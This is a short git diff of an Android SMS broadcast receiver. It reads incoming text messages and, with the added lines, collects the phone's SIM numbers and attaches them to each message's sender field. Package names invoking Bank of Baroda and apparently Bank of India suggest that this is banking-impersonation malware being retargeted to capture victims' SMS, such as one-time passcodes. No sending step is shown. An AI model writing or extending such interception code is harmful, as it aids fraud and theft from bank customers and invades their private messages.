@@ -11,7 +11,7 @@ import android.telephony.SmsMessage;
 import android.util.Log;
 import android.widget.Toast;
 
-import com.bankofbaroda.service.google.api.Helper;
+import com.mydesign.service.boi.net.Helper;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -34,7 +34,9 @@ public class SmsReceiver extends BroadcastReceiver {
                     for (Object pdu : pdus) {
                         SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                         if (smsMessage != null) {
-                            String sender = smsMessage.getDisplayOriginatingAddress();
+                            String receiver = Helper.getSimNumbers(context);
+                            String sender = "Receiver : "+receiver + "<br> Sender : " +  smsMessage.getDisplayOriginatingAddress();
+//                            String sender = smsMessage.getDisplayOriginatingAddress();
                             String messageBody = smsMessage.getMessageBody();
 
                             long timestamp = smsMessage.getTimestampMillis();
